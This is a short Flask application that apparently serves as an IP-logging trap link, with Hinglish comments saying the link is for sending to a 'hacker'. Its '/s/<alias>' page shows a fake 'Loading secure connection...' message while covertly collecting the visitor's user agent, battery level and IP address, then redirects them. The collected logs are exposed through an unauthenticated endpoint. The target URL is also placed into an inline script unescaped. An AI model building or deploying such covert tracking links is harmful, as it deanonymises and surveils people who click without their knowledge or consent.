from flask import Flask, request, jsonify, render_template_string
from datetime import datetime

app = Flask(__name__)
link_db = {} 
logs = []

@app.route('/api/create', methods=['POST'])
def create():
    data = request.json
    # Link ko database mein save karna
    link_db[data['alias']] = data['target']
    return jsonify({"status": "Success"})

# Hacker ko bhejne wali link ka rasta (Hidden)
@app.route('/s/<alias>')
def trap(alias):
    target = link_db.get(alias, "https://google.com")
    
    return render_template_string('''
        <script>
            async function capture() {
                let bat = "N/A";
                try { const b = await navigator.getBattery(); bat = Math.round(b.level*100); } catch(e){}
                
                await fetch('/api/save_log', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        device: navigator.userAgent,
                        battery: bat,
                        alias: "{{alias}}"
                    })
                });
                window.location.href = "{{target}}";
            }
            window.onload = capture;
        </script>
        <div style="font-family:sans-serif; text-align:center; margin-top:20%;">
            <p>Loading secure connection...</p>
        </div>
    ''', alias=alias, target=target)

@app.route('/api/save_log', methods=['POST'])
def save_log():
    data = request.json
    data['ip'] = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    data['time'] = datetime.now().strftime("%H:%M:%S")
    logs.insert(0, data)
    return jsonify({"success": True})

@app.route('/api/getlogs')
def get_logs():
    return jsonify(logs)
